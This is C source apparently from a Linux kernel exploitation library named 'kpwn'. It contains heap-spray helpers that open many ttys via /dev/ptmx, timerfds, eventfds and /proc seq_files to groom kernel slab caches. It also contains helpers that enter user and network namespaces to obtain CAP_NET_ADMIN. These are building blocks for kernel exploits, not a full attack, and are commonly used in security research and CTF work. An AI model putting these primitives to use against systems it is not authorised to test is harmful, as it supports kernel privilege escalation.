#define _GNU_SOURCE

#include <fcntl.h>
#include <kpwn/logger.h>
#include <kpwn/spray_extra.h>
#include <kpwn/utils.h>
#include <sched.h>
#include <stdio.h>
#include <string.h>
#include <sys/eventfd.h>
#include <sys/timerfd.h>
#include <unistd.h>

// --- tty_struct via /dev/ptmx ------------------------------------------------

int kpwn_spray_tty(int *fds, size_t n) {
  for (size_t i = 0; i < n; i++) {
    fds[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
    if (fds[i] < 0) {
      log_error("[kpwn:spray] tty open failed at %zu", i);
      return -1;
    }
  }
  log_debug("[kpwn:spray] tty n=%zu", n);
  return 0;
}

int kpwn_free_tty(int *fds, size_t n) {
  for (size_t i = 0; i < n; i++)
    close(fds[i]);
  log_debug("[kpwn:spray] freed %zu ttys", n);
  return 0;
}

// --- timerfd_ctx -------------------------------------------------------------

int kpwn_spray_timerfd(int *fds, size_t n) {
  for (size_t i = 0; i < n; i++) {
    fds[i] = timerfd_create(CLOCK_MONOTONIC, 0);
    if (fds[i] < 0) {
      log_error("[kpwn:spray] timerfd_create failed at %zu", i);
      return -1;
    }
  }
  log_debug("[kpwn:spray] timerfd n=%zu", n);
  return 0;
}

int kpwn_free_timerfd(int *fds, size_t n) {
  for (size_t i = 0; i < n; i++)
    close(fds[i]);
  log_debug("[kpwn:spray] freed %zu timerfds", n);
  return 0;
}

// --- eventfd_ctx -------------------------------------------------------------

int kpwn_spray_eventfd(int *fds, size_t n, unsigned int initval) {
  for (size_t i = 0; i < n; i++) {
    fds[i] = eventfd(initval, 0);
    if (fds[i] < 0) {
      log_error("[kpwn:spray] eventfd failed at %zu", i);
      return -1;
    }
  }
  log_debug("[kpwn:spray] eventfd n=%zu initval=%u", n, initval);
  return 0;
}

int kpwn_free_eventfd(int *fds, size_t n) {
  for (size_t i = 0; i < n; i++)
    close(fds[i]);
  log_debug("[kpwn:spray] freed %zu eventfds", n);
  return 0;
}

// --- seq_file via /proc/ -----------------------------------------------------

int kpwn_spray_seqfile(int *fds, size_t n, const char *proc_path) {
  for (size_t i = 0; i < n; i++) {
    fds[i] = open(proc_path, O_RDONLY);
    if (fds[i] < 0) {
      log_error("[kpwn:spray] seqfile open(%s) failed at %zu", proc_path, i);
      return -1;
    }
  }
  log_debug("[kpwn:spray] seqfile n=%zu path=%s", n, proc_path);
  return 0;
}

int kpwn_free_seqfile(int *fds, size_t n) {
  for (size_t i = 0; i < n; i++)
    close(fds[i]);
  log_debug("[kpwn:spray] freed %zu seqfiles", n);
  return 0;
}

// --- Namespace helpers -------------------------------------------------------

int kpwn_userns_enter(void) {
  if (unshare(CLONE_NEWUSER) < 0) {
    log_error("[kpwn:ns] unshare(CLONE_NEWUSER) failed");
    return -1;
  }
  // Map uid 0 in the new namespace
  FILE *f = fopen("/proc/self/uid_map", "w");
  if (f) {
    fprintf(f, "0 %d 1\n", getuid());
    fclose(f);
  }
  f = fopen("/proc/self/setgroups", "w");
  if (f) {
    fprintf(f, "deny\n");
    fclose(f);
  }
  f = fopen("/proc/self/gid_map", "w");
  if (f) {
    fprintf(f, "0 %d 1\n", getgid());
    fclose(f);
  }
  log_success("[kpwn:ns] entered user namespace (uid=0 mapped)");
  return 0;
}

int kpwn_netns_enter(void) {
  if (unshare(CLONE_NEWNET) < 0) {
    log_error("[kpwn:ns] unshare(CLONE_NEWNET) failed");
    return -1;
  }
  log_success("[kpwn:ns] entered net namespace");
  return 0;
}

int kpwn_ns_setup_net_admin(void) {
  int ret = kpwn_userns_enter();
  if (ret < 0)
    return ret;
  ret = kpwn_netns_enter();
  if (ret < 0)
    return ret;
  log_success("[kpwn:ns] user+net namespace with CAP_NET_ADMIN ready");
  return 0;
}
